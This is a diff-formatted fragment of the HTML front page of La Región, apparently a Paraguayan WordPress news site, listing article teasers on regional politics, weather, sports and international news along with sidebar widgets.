+                <nav class="nav-container group desktop-menu " id="nav-header" data-menu-id="header-3">
+    <div class="nav-text"><!-- put your mobile menu text here --></div>
+  <div class="nav-wrap container">
+        <ul id="menu-categorias-1" class="nav container-inner group"><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-22"><a href="categorias/locales/">Locales</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-25"><a href="categorias/regionales/">Regionales</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23"><a href="categorias/nacionales/">Nacionales</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-21"><a href="categorias/internacionales/">Internacionales</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-24"><a href="categorias/politica/">Política</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-20"><a href="categorias/deportes/">Deportes</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-357"><a href="categorias/empresariales/">Empresariales</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3995"><a href="categorias/eventos-sociales/">Eventos & Sociales</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3996"><a href="https://guiapar.com.py/">GuíaPar</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3997"><a href="http://app.com.py/">APP (Agenda Política)</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4988"><a href="revistas/">Revista</a></li>
+</ul>  </div>
+</nav><!--/#nav-header-->      
+    </div><!--/.container-inner-->
+      </div><!--/.container-->
+</header><!--/#header-->
+  <div class="container" id="page">
+    <div class="container-inner">
+            <div class="main">
+        <div class="main-inner group">
+              <main class="content" id="content">
+              <div class="page-title hu-pad group">
+          				    			<h2>La Región <span class="hu-blog-subheading">Noticias</span></h2>
+    </div><!--/.page-title-->
+          <div class="hu-pad group">
+	<div class="featured flexslider" id="flexslider-featured">
+		<ul class="slides">
+						<li>
+<article id="post-5059" class="group post-5059 post type-post status-publish format-standard has-post-thumbnail hentry category-internacionales">
+	<div class="post-inner post-hover">
+		<div class="post-thumbnail featured-img-thumb-large">
+			<a href="desarrollan-una-vacuna-contra-el-cancer-de-rinon-con-un-100-de-eficacia/">
+				<img width="693" height="340" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2025/02/gkjsdgjgdsa-693x340.jpg" class="attachment-thumb-large size-thumb-large wp-post-image" alt="" decoding="async" fetchpriority="high"/>															</a>
+					</div><!--/.post-thumbnail-->
+      		<div class="post-meta group">
+                  <p class="post-category"><a href="categorias/internacionales/" rel="category tag">Internacionales</a></p>
+                          <p class="post-date">
+  <time class="published updated" datetime="2025-02-07 07:38:52">7 febrero 2025</time>
+</p>
+  <p class="post-byline" style="display:none">&nbsp;por    <span class="vcard author">
+      <span class="fn"><a href="author/frank777/" title="Entradas de Francisco Insfrán" rel="author">Francisco Insfrán</a></span>
+    </span> &middot; Published <span class="published">7 febrero 2025</span>
+      </p>
+          		</div><!--/.post-meta-->
+		<h2 class="post-title entry-title">
+			<a href="desarrollan-una-vacuna-contra-el-cancer-de-rinon-con-un-100-de-eficacia/" rel="bookmark">Desarrollan una vacuna contra el cáncer de riñón con un 100% de eficacia.</a>
+		</h2><!--/.post-title-->
+		  		<div class="entry excerpt entry-summary">
+  			  		</div><!--/.entry-->
+	</div><!--/.post-inner-->
+</article><!--/.post-->			</li>
+						<li>
+<article id="post-5056" class="group post-5056 post type-post status-publish format-standard has-post-thumbnail hentry category-politica tag-rocio-vallejo">
+	<div class="post-inner post-hover">
+		<div class="post-thumbnail featured-img-thumb-large">
+			<a href="presentaron-libelo-acusatorio-contra-diputado-por-uso-indebido-de-influencias/">
+				<img width="720" height="340" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2025/02/gsdhjgksfas-720x340.jpg" class="attachment-thumb-large size-thumb-large wp-post-image" alt="" decoding="async" data-srcset="https://laregion.com.py/wp-content/uploads/2025/02/gsdhjgksfas-720x340.jpg 720w, https://laregion.com.py/wp-content/uploads/2025/02/gsdhjgksfas-520x245.jpg 520w" data-sizes="(max-width: 720px) 100vw, 720px"/>															</a>
+					</div><!--/.post-thumbnail-->
+      		<div class="post-meta group">
+                  <p class="post-category"><a href="categorias/politica/" rel="category tag">Política</a></p>
+                          <p class="post-date">
+  <time class="published updated" datetime="2025-02-07 07:29:01">7 febrero 2025</time>
+</p>
+  <p class="post-byline" style="display:none">&nbsp;por    <span class="vcard author">
+      <span class="fn"><a href="author/frank777/" title="Entradas de Francisco Insfrán" rel="author">Francisco Insfrán</a></span>
+    </span> &middot; Published <span class="published">7 febrero 2025</span>
+      </p>
+          		</div><!--/.post-meta-->
+		<h2 class="post-title entry-title">
+			<a href="presentaron-libelo-acusatorio-contra-diputado-por-uso-indebido-de-influencias/" rel="bookmark">Presentaron libelo acusatorio contra diputado por uso indebido de influencias</a>
+		</h2><!--/.post-title-->
+		  		<div class="entry excerpt entry-summary">
+  			  		</div><!--/.entry-->
+	</div><!--/.post-inner-->
+</article><!--/.post-->			</li>
+						<li>
+<article id="post-5051" class="group post-5051 post type-post status-publish format-standard has-post-thumbnail hentry category-regionales tag-el-tiempo-en-la-region tag-pronostico">
+	<div class="post-inner post-hover">
+		<div class="post-thumbnail featured-img-thumb-large">
+			<a href="meteorologia-anuncia-lluvias-con-tormentas-electricas-moderadas-a-fuertes/">
+				<img width="720" height="340" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2024/08/Nublado-Lluvia-ok-720x340.jpg" class="attachment-thumb-large size-thumb-large wp-post-image" alt="" decoding="async" data-srcset="https://laregion.com.py/wp-content/uploads/2024/08/Nublado-Lluvia-ok-720x340.jpg 720w, https://laregion.com.py/wp-content/uploads/2024/08/Nublado-Lluvia-ok-520x245.jpg 520w" data-sizes="(max-width: 720px) 100vw, 720px"/>															</a>
+					</div><!--/.post-thumbnail-->
+      		<div class="post-meta group">
+                  <p class="post-category"><a href="categorias/regionales/" rel="category tag">Regionales</a></p>
+                          <p class="post-date">
+  <time class="published updated" datetime="2024-08-22 00:02:26">22 agosto 2024</time>
+</p>
+  <p class="post-byline" style="display:none">&nbsp;por    <span class="vcard author">
+      <span class="fn"><a href="author/frank777/" title="Entradas de Francisco Insfrán" rel="author">Francisco Insfrán</a></span>
+    </span> &middot; Published <span class="published">22 agosto 2024</span>
+      </p>
+          		</div><!--/.post-meta-->
+		<h2 class="post-title entry-title">
+			<a href="meteorologia-anuncia-lluvias-con-tormentas-electricas-moderadas-a-fuertes/" rel="bookmark">Meteorología anuncia lluvias con tormentas eléctricas moderadas a fuertes</a>
+		</h2><!--/.post-title-->
+		  		<div class="entry excerpt entry-summary">
+  			  		</div><!--/.entry-->
+	</div><!--/.post-inner-->
+</article><!--/.post-->			</li>
+						<li>
+<article id="post-5048" class="group post-5048 post type-post status-publish format-standard has-post-thumbnail hentry category-nacionales">
+	<div class="post-inner post-hover">
+		<div class="post-thumbnail featured-img-thumb-large">
+			<a href="cesar-sosa-asume-la-presidencia-del-consejo-de-gobernadores-con-el-apoyo-del-presidente-pena/">
+				<img width="720" height="340" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2024/08/cesar-sosa-720x340.jpg" class="attachment-thumb-large size-thumb-large wp-post-image" alt="" decoding="async" data-srcset="https://laregion.com.py/wp-content/uploads/2024/08/cesar-sosa-720x340.jpg 720w, https://laregion.com.py/wp-content/uploads/2024/08/cesar-sosa-520x245.jpg 520w" data-sizes="(max-width: 720px) 100vw, 720px"/>															</a>
+					</div><!--/.post-thumbnail-->
+      		<div class="post-meta group">
+                  <p class="post-category"><a href="categorias/nacionales/" rel="category tag">Nacionales</a></p>
+                          <p class="post-date">
+  <time class="published updated" datetime="2024-08-21 23:44:36">21 agosto 2024</time>
+</p>
+  <p class="post-byline" style="display:none">&nbsp;por    <span class="vcard author">
+      <span class="fn"><a href="author/frank777/" title="Entradas de Francisco Insfrán" rel="author">Francisco Insfrán</a></span>
+    </span> &middot; Published <span class="published">21 agosto 2024</span>
+      </p>
+          		</div><!--/.post-meta-->
+		<h2 class="post-title entry-title">
+			<a href="cesar-sosa-asume-la-presidencia-del-consejo-de-gobernadores-con-el-apoyo-del-presidente-pena/" rel="bookmark">César Sosa Asume la Presidencia del Consejo de Gobernadores con el Apoyo del Presidente Peña</a>
+		</h2><!--/.post-title-->
+		  		<div class="entry excerpt entry-summary">
+  			  		</div><!--/.entry-->
+	</div><!--/.post-inner-->
+</article><!--/.post-->			</li>
+						<li>
+<article id="post-5044" class="group post-5044 post type-post status-publish format-standard has-post-thumbnail hentry category-regionales">
+	<div class="post-inner post-hover">
+		<div class="post-thumbnail featured-img-thumb-large">
+			<a href="mujer-acaba-con-la-vida-de-una-joven-de-19-anos-en-misiones/">
+				<img width="720" height="340" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2024/07/yanice-720x340.jpg" class="attachment-thumb-large size-thumb-large wp-post-image" alt="" decoding="async" data-srcset="https://laregion.com.py/wp-content/uploads/2024/07/yanice-720x340.jpg 720w, https://laregion.com.py/wp-content/uploads/2024/07/yanice-520x245.jpg 520w" data-sizes="(max-width: 720px) 100vw, 720px"/>															</a>
+					</div><!--/.post-thumbnail-->
+      		<div class="post-meta group">
+                  <p class="post-category"><a href="categorias/regionales/" rel="category tag">Regionales</a></p>
+                          <p class="post-date">
+  <time class="published updated" datetime="2024-07-08 18:34:13">8 julio 2024</time>
+</p>
+  <p class="post-byline" style="display:none">&nbsp;por    <span class="vcard author">
+      <span class="fn"><a href="author/frank777/" title="Entradas de Francisco Insfrán" rel="author">Francisco Insfrán</a></span>
+    </span> &middot; Published <span class="published">8 julio 2024</span>
+      </p>
+          		</div><!--/.post-meta-->
+		<h2 class="post-title entry-title">
+			<a href="mujer-acaba-con-la-vida-de-una-joven-de-19-anos-en-misiones/" rel="bookmark">Mujer acaba con la vida de una joven de 19 años en Misiones</a>
+		</h2><!--/.post-title-->
+		  		<div class="entry excerpt entry-summary">
+  			  		</div><!--/.entry-->
+	</div><!--/.post-inner-->
+</article><!--/.post-->			</li>
+					</ul>
+	</div><!--/.featured-->
+          <div id="grid-wrapper" class="post-list group">
+    <div class="code-block code-block-1" style="margin: 8px auto; text-align: center; display: block; clear: both;">
+<div align="center"><img src="https://laregion.com.py/wp-content/uploads/2022/02/Alquimia_500×100.gif" alt="" width="500" height="100"></div>
+</div>
+<div class="post-row">        <article id="post-5039" class="group grid-item post-5039 post type-post status-publish format-standard has-post-thumbnail hentry category-regionales">
+	<div class="post-inner post-hover">
+      		<div class="post-thumbnail">
+  			<a href="paraguay-busca-avanzar-en-produccion-y-mayor-calidad-en-el-rubro-banana/">
+            				<img width="720" height="340" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2024/07/004-720x340.jpg" class="attachment-thumb-large size-thumb-large wp-post-image" alt="" decoding="async" loading="lazy" data-srcset="https://laregion.com.py/wp-content/uploads/2024/07/004-720x340.jpg 720w, https://laregion.com.py/wp-content/uploads/2024/07/004-520x245.jpg 520w" data-sizes="auto, (max-width: 720px) 100vw, 720px"/>  				  				  				  			</a>
+  			  		</div><!--/.post-thumbnail-->
+          		<div class="post-meta group">
+          			  <p class="post-category"><a href="categorias/regionales/" rel="category tag">Regionales</a></p>
+                  			  <p class="post-date">
+  <time class="published updated" datetime="2024-07-08 18:01:00">8 julio 2024</time>
+</p>
+  <p class="post-byline" style="display:none">&nbsp;por    <span class="vcard author">
+      <span class="fn"><a href="author/frank777/" title="Entradas de Francisco Insfrán" rel="author">Francisco Insfrán</a></span>
+    </span> &middot; Published <span class="published">8 julio 2024</span>
+      </p>
+          		</div><!--/.post-meta-->
+    		<h2 class="post-title entry-title">
+			<a href="paraguay-busca-avanzar-en-produccion-y-mayor-calidad-en-el-rubro-banana/" rel="bookmark">Paraguay busca avanzar en producción y mayor calidad en el rubro banana</a>
+		</h2><!--/.post-title-->
+	</div><!--/.post-inner-->
+</article><!--/.post-->
+            <article id="post-5023" class="group grid-item post-5023 post type-post status-publish format-standard has-post-thumbnail hentry category-regionales tag-intendente-manuel-solis tag-manolo-solis tag-manuel-solis">
+	<div class="post-inner post-hover">
+      		<div class="post-thumbnail">
+  			<a href="gestion-institucional-de-manolo-solis-entre-los-mejores-en-el-departamento-de-caaguazu/">
+            				<img width="720" height="340" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2024/01/Encuesta-Calificacion-de-Gestion-Institucional-Alquimi-Consultora-720x340.jpg" class="attachment-thumb-large size-thumb-large wp-post-image" alt="" decoding="async" loading="lazy" data-srcset="https://laregion.com.py/wp-content/uploads/2024/01/Encuesta-Calificacion-de-Gestion-Institucional-Alquimi-Consultora-720x340.jpg 720w, https://laregion.com.py/wp-content/uploads/2024/01/Encuesta-Calificacion-de-Gestion-Institucional-Alquimi-Consultora-520x245.jpg 520w" data-sizes="auto, (max-width: 720px) 100vw, 720px"/>  				  				  				  			</a>
+  			  		</div><!--/.post-thumbnail-->
+          		<div class="post-meta group">
+          			  <p class="post-category"><a href="categorias/regionales/" rel="category tag">Regionales</a></p>
+                  			  <p class="post-date">
+  <time class="published updated" datetime="2024-01-22 19:52:22">22 enero 2024</time>
+</p>
+  <p class="post-byline" style="display:none">&nbsp;por    <span class="vcard author">
+      <span class="fn"><a href="author/frank777/" title="Entradas de Francisco Insfrán" rel="author">Francisco Insfrán</a></span>
+    </span> &middot; Published <span class="published">22 enero 2024</span>
+      </p>
+          		</div><!--/.post-meta-->
+    		<h2 class="post-title entry-title">
+			<a href="gestion-institucional-de-manolo-solis-entre-los-mejores-en-el-departamento-de-caaguazu/" rel="bookmark">Gestión Institucional de Manolo Solís entre los mejores en el departamento de Caaguazú</a>
+		</h2><!--/.post-title-->
+	</div><!--/.post-inner-->
+</article><!--/.post-->
+    </div><div class="post-row">        <article id="post-5019" class="group grid-item post-5019 post type-post status-publish format-standard has-post-thumbnail hentry category-internacionales tag-japon tag-terremoto">
+	<div class="post-inner post-hover">
+      		<div class="post-thumbnail">
+  			<a href="un-terremoto-de-magnitud-76-deja-al-menos-48-muertos-y-graves-danos-en-japon/">
+            				<img width="720" height="340" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2024/01/hhfgajhf-720x340.jpg" class="attachment-thumb-large size-thumb-large wp-post-image" alt="" decoding="async" loading="lazy" data-srcset="https://laregion.com.py/wp-content/uploads/2024/01/hhfgajhf-720x340.jpg 720w, https://laregion.com.py/wp-content/uploads/2024/01/hhfgajhf-520x245.jpg 520w" data-sizes="auto, (max-width: 720px) 100vw, 720px"/>  				  				  				  			</a>
+  			  		</div><!--/.post-thumbnail-->
+          		<div class="post-meta group">
+          			  <p class="post-category"><a href="categorias/internacionales/" rel="category tag">Internacionales</a></p>
+                  			  <p class="post-date">
+  <time class="published updated" datetime="2024-01-02 08:31:44">2 enero 2024</time>
+</p>
+  <p class="post-byline" style="display:none">&nbsp;por    <span class="vcard author">
+      <span class="fn"><a href="author/frank777/" title="Entradas de Francisco Insfrán" rel="author">Francisco Insfrán</a></span>
+    </span> &middot; Published <span class="published">2 enero 2024</span>
+      </p>
+          		</div><!--/.post-meta-->
+    		<h2 class="post-title entry-title">
+			<a href="un-terremoto-de-magnitud-76-deja-al-menos-48-muertos-y-graves-danos-en-japon/" rel="bookmark">Un terremoto de magnitud 7,6 deja al menos 48 muertos y graves daños en Japón</a>
+		</h2><!--/.post-title-->
+	</div><!--/.post-inner-->
+</article><!--/.post-->
+            <article id="post-5015" class="group grid-item post-5015 post type-post status-publish format-standard has-post-thumbnail hentry category-regionales">
+	<div class="post-inner post-hover">
+      		<div class="post-thumbnail">
+  			<a href="golpes-disparos-y-descontrol-asi-reciben-algunos-jovenes-al-ano-nuevo/">
+            				<img width="355" height="197" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2024/01/0001.jpg" class="attachment-thumb-large size-thumb-large wp-post-image" alt="" decoding="async" loading="lazy" data-srcset="https://laregion.com.py/wp-content/uploads/2024/01/0001.jpg 355w, https://laregion.com.py/wp-content/uploads/2024/01/0001-300x166.jpg 300w" data-sizes="auto, (max-width: 355px) 100vw, 355px"/>  				  				  				  			</a>
+  			  		</div><!--/.post-thumbnail-->
+          		<div class="post-meta group">
+          			  <p class="post-category"><a href="categorias/regionales/" rel="category tag">Regionales</a></p>
+                  			  <p class="post-date">
+  <time class="published updated" datetime="2024-01-01 20:20:16">1 enero 2024</time>
+</p>
+  <p class="post-byline" style="display:none">&nbsp;por    <span class="vcard author">
+      <span class="fn"><a href="author/frank777/" title="Entradas de Francisco Insfrán" rel="author">Francisco Insfrán</a></span>
+    </span> &middot; Published <span class="published">1 enero 2024</span>
+     &middot; Last modified <span class="updated">7 febrero 2025</span>  </p>
+          		</div><!--/.post-meta-->
+    		<h2 class="post-title entry-title">
+			<a href="golpes-disparos-y-descontrol-asi-reciben-algunos-jovenes-al-ano-nuevo/" rel="bookmark">Golpes, disparos y descontrol: Así reciben algunos jóvenes al Año Nuevo</a>
+		</h2><!--/.post-title-->
+	</div><!--/.post-inner-->
+</article><!--/.post-->
+    </div><div class="post-row">        <article id="post-5007" class="group grid-item post-5007 post type-post status-publish format-standard has-post-thumbnail hentry category-regionales tag-capabap tag-exportadores-de-banana tag-productores-de-banana">
+	<div class="post-inner post-hover">
+      		<div class="post-thumbnail">
+  			<a href="nuevo-sedi-de-argentina-desburocratiza-exportaciones-pero-no-resuelve-deudas/">
+            				<img width="666" height="340" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2023/12/0201-2-666x340.jpg" class="attachment-thumb-large size-thumb-large wp-post-image" alt="" decoding="async" loading="lazy"/>  				  				  				  			</a>
+  			  		</div><!--/.post-thumbnail-->
+          		<div class="post-meta group">
+          			  <p class="post-category"><a href="categorias/regionales/" rel="category tag">Regionales</a></p>
+                  			  <p class="post-date">
+  <time class="published updated" datetime="2023-12-29 08:01:31">29 diciembre 2023</time>
+</p>
+  <p class="post-byline" style="display:none">&nbsp;por    <span class="vcard author">
+      <span class="fn"><a href="author/frank777/" title="Entradas de Francisco Insfrán" rel="author">Francisco Insfrán</a></span>
+    </span> &middot; Published <span class="published">29 diciembre 2023</span>
+      </p>
+          		</div><!--/.post-meta-->
+    		<h2 class="post-title entry-title">
+			<a href="nuevo-sedi-de-argentina-desburocratiza-exportaciones-pero-no-resuelve-deudas/" rel="bookmark">Nuevo SEDI de Argentina desburocratiza exportaciones, pero no resuelve deudas</a>
+		</h2><!--/.post-title-->
+	</div><!--/.post-inner-->
+</article><!--/.post-->
+            <article id="post-5002" class="group grid-item post-5002 post type-post status-publish format-standard has-post-thumbnail hentry category-deportes tag-messi">
+	<div class="post-inner post-hover">
+      		<div class="post-thumbnail">
+  			<a href="messi-hizo-historia-en-estados-unidos-se-consagro-campeon-con-el-inter-miami/">
+            				<img width="720" height="340" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2023/08/gakgfahfakejr-720x340.jpg" class="attachment-thumb-large size-thumb-large wp-post-image" alt="" decoding="async" loading="lazy" data-srcset="https://laregion.com.py/wp-content/uploads/2023/08/gakgfahfakejr-720x340.jpg 720w, https://laregion.com.py/wp-content/uploads/2023/08/gakgfahfakejr-520x245.jpg 520w" data-sizes="auto, (max-width: 720px) 100vw, 720px"/>  				  				  				  			</a>
+  			  		</div><!--/.post-thumbnail-->
+          		<div class="post-meta group">
+          			  <p class="post-category"><a href="categorias/deportes/" rel="category tag">Deportes</a></p>
+                  			  <p class="post-date">
+  <time class="published updated" datetime="2023-08-20 10:29:05">20 agosto 2023</time>
+</p>
+  <p class="post-byline" style="display:none">&nbsp;por    <span class="vcard author">
+      <span class="fn"><a href="author/frank777/" title="Entradas de Francisco Insfrán" rel="author">Francisco Insfrán</a></span>
+    </span> &middot; Published <span class="published">20 agosto 2023</span>
+      </p>
+          		</div><!--/.post-meta-->
+    		<h2 class="post-title entry-title">
+			<a href="messi-hizo-historia-en-estados-unidos-se-consagro-campeon-con-el-inter-miami/" rel="bookmark">Messi hizo historia en Estados Unidos: se consagró campeón con el Inter Miami</a>
+		</h2><!--/.post-title-->
+	</div><!--/.post-inner-->
+</article><!--/.post-->
+    </div><div class="post-row">        <article id="post-4997" class="group grid-item post-4997 post type-post status-publish format-standard has-post-thumbnail hentry category-deportes tag-espana tag-espana-campeon tag-seleccion-femenina-de-futbol">
+	<div class="post-inner post-hover">
+      		<div class="post-thumbnail">
+  			<a href="espana-se-consagra-campeona-de-futbol-femenino/">
+            				<img width="526" height="340" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2023/08/zgzdtgg-526x340.jpg" class="attachment-thumb-large size-thumb-large wp-post-image" alt="" decoding="async" loading="lazy"/>  				  				  				  			</a>
+  			  		</div><!--/.post-thumbnail-->
+          		<div class="post-meta group">
+          			  <p class="post-category"><a href="categorias/deportes/" rel="category tag">Deportes</a></p>
+                  			  <p class="post-date">
+  <time class="published updated" datetime="2023-08-20 09:04:46">20 agosto 2023</time>
+</p>
+  <p class="post-byline" style="display:none">&nbsp;por    <span class="vcard author">
+      <span class="fn"><a href="author/frank777/" title="Entradas de Francisco Insfrán" rel="author">Francisco Insfrán</a></span>
+    </span> &middot; Published <span class="published">20 agosto 2023</span>
+      </p>
+          		</div><!--/.post-meta-->
+    		<h2 class="post-title entry-title">
+			<a href="espana-se-consagra-campeona-de-futbol-femenino/" rel="bookmark">España se consagra campeona de Futbol femenino</a>
+		</h2><!--/.post-title-->
+	</div><!--/.post-inner-->
+</article><!--/.post-->
+            <article id="post-4992" class="group grid-item post-4992 post type-post status-publish format-standard has-post-thumbnail hentry category-locales tag-gobernador-marcelo-soto tag-marcelo-soto">
+	<div class="post-inner post-hover">
+      		<div class="post-thumbnail">
+  			<a href="el-gobernador-marcelo-soto-celebro-el-dia-del-nino-en-caaguazu-y-cnel-oviedo/">
+            				<img width="600" height="338" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2023/08/m1.jpg" class="attachment-thumb-large size-thumb-large wp-post-image" alt="" decoding="async" loading="lazy" data-srcset="https://laregion.com.py/wp-content/uploads/2023/08/m1.jpg 600w, https://laregion.com.py/wp-content/uploads/2023/08/m1-300x169.jpg 300w" data-sizes="auto, (max-width: 600px) 100vw, 600px"/>  				  				  				  			</a>
+  			  		</div><!--/.post-thumbnail-->
+          		<div class="post-meta group">
+          			  <p class="post-category"><a href="categorias/locales/" rel="category tag">Locales</a></p>
+                  			  <p class="post-date">
+  <time class="published updated" datetime="2023-08-19 18:58:17">19 agosto 2023</time>
+</p>
+  <p class="post-byline" style="display:none">&nbsp;por    <span class="vcard author">
+      <span class="fn"><a href="author/frank777/" title="Entradas de Francisco Insfrán" rel="author">Francisco Insfrán</a></span>
+    </span> &middot; Published <span class="published">19 agosto 2023</span>
+      </p>
+          		</div><!--/.post-meta-->
+    		<h2 class="post-title entry-title">
+			<a href="el-gobernador-marcelo-soto-celebro-el-dia-del-nino-en-caaguazu-y-cnel-oviedo/" rel="bookmark">El Gobernador Marcelo Soto celebró el Día del Niño en Caaguazú y Cnel. Oviedo</a>
+		</h2><!--/.post-title-->
+	</div><!--/.post-inner-->
+</article><!--/.post-->
+    </div><div class="post-row">        <article id="post-4976" class="group grid-item post-4976 post type-post status-publish format-standard has-post-thumbnail hentry category-revista">
+	<div class="post-inner post-hover">
+      		<div class="post-thumbnail">
+  			<a href="la-region-revista-01/">
+            				<img width="621" height="340" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2023/08/La-Region-1-621x340.png" class="attachment-thumb-large size-thumb-large wp-post-image" alt="" decoding="async" loading="lazy"/>  				  				  				  			</a>
+  			  		</div><!--/.post-thumbnail-->
+          		<div class="post-meta group">
+          			  <p class="post-category"><a href="categorias/revista/" rel="category tag">Revista</a></p>
+                  			  <p class="post-date">
+  <time class="published updated" datetime="2023-08-17 09:43:47">17 agosto 2023</time>
+</p>
+  <p class="post-byline" style="display:none">&nbsp;por    <span class="vcard author">
+      <span class="fn"><a href="author/regionaluser/" title="Entradas de regionaluser" rel="author">regionaluser</a></span>
+    </span> &middot; Published <span class="published">17 agosto 2023</span>
+      </p>
+          		</div><!--/.post-meta-->
+    		<h2 class="post-title entry-title">
+			<a href="la-region-revista-01/" rel="bookmark">La Región Revista #01</a>
+		</h2><!--/.post-title-->
+	</div><!--/.post-inner-->
+</article><!--/.post-->
+            <article id="post-4971" class="group grid-item post-4971 post type-post status-publish format-standard has-post-thumbnail hentry category-revista">
+	<div class="post-inner post-hover">
+      		<div class="post-thumbnail">
+  			<a href="la-region-revista-03/">
+            				<img width="621" height="340" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2023/08/La-Region-3-621x340.png" class="attachment-thumb-large size-thumb-large wp-post-image" alt="" decoding="async" loading="lazy"/>  				  				  				  			</a>
+  			  		</div><!--/.post-thumbnail-->
+          		<div class="post-meta group">
+          			  <p class="post-category"><a href="categorias/revista/" rel="category tag">Revista</a></p>
+                  			  <p class="post-date">
+  <time class="published updated" datetime="2023-08-17 09:36:49">17 agosto 2023</time>
+</p>
+  <p class="post-byline" style="display:none">&nbsp;por    <span class="vcard author">
+      <span class="fn"><a href="author/regionaluser/" title="Entradas de regionaluser" rel="author">regionaluser</a></span>
+    </span> &middot; Published <span class="published">17 agosto 2023</span>
+      </p>
+          		</div><!--/.post-meta-->
+    		<h2 class="post-title entry-title">
+			<a href="la-region-revista-03/" rel="bookmark">La Región Revista #03</a>
+		</h2><!--/.post-title-->
+	</div><!--/.post-inner-->
+</article><!--/.post-->
+    </div>  </div><!--/.post-list-->
+<nav class="pagination group">
+			<ul class="group">
+			<li class="prev left"></li>
+			<li class="next right"><a href="page/2/">Página siguiente &raquo;</a></li>
+		</ul>
+	</nav><!--/.pagination-->
+          </div><!--/.hu-pad-->
+            </main><!--/.content-->
+	<div class="sidebar s1 collapsed" data-position="left" data-layout="col-3cm" data-sb-id="s1">
+		<button class="sidebar-toggle" title="Amplia la barra lateral"><i class="fas sidebar-toggle-arrows"></i></button>
+		<div class="sidebar-content">
+			           			<div class="sidebar-top group">
+                        <p>Redes sociales: </p>                    <ul class="social-links"><li><a rel="nofollow noopener noreferrer" class="social-tooltip" title="Síguenos en Facebook" aria-label="Síguenos en Facebook" href="https://www.facebook.com/laregionparaguay/" target="_blank"><i class="fab fa-facebook-square"></i></a></li><li><a rel="nofollow noopener noreferrer" class="social-tooltip" title="Síguenos en Twitter-square" aria-label="Síguenos en Twitter-square" href="https://twitter.com/laregionoticias" target="_blank"><i class="fab fa-twitter-square"></i></a></li></ul>  			</div>
+			<div id="custom_html-6" class="widget_text widget widget_custom_html"><h3 class="widget-title">Revista</h3><div class="textwidget custom-html-widget"><a href="la-region-revista-03/"><img src="https://laregion.com.py/wp-content/uploads/2023/08/Pag.-01_page-0001.jpg" width="300"></a></div></div><div id="custom_html-2" class="widget_text widget widget_custom_html"><h3 class="widget-title">Radio</h3><div class="textwidget custom-html-widget"><iframe src="public/laregion/embed_theme-light_ext_iframe/" frameborder="0" allowtransparency="true" style="width: 100%; min-height: 150px; border: 0;"></iframe></div></div><div id="alxposts-2" class="widget widget_hu_posts">
+<h3 class="widget-title">Locales</h3>
+	<ul class="alx-posts group thumbs-enabled">
+    				<li>
+						<div class="post-item-thumbnail">
+				<a href="el-gobernador-marcelo-soto-celebro-el-dia-del-nino-en-caaguazu-y-cnel-oviedo/">
+					<img width="520" height="245" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://laregion.com.py/wp-content/uploads/2023/08/m1-520x245.jpg" class="attachment-thumb-medium size-thumb-medium wp-post-image" alt="" decoding="async" loading="lazy"/>																			</a>
+			</div>
+			<div class="post-item-inner group">
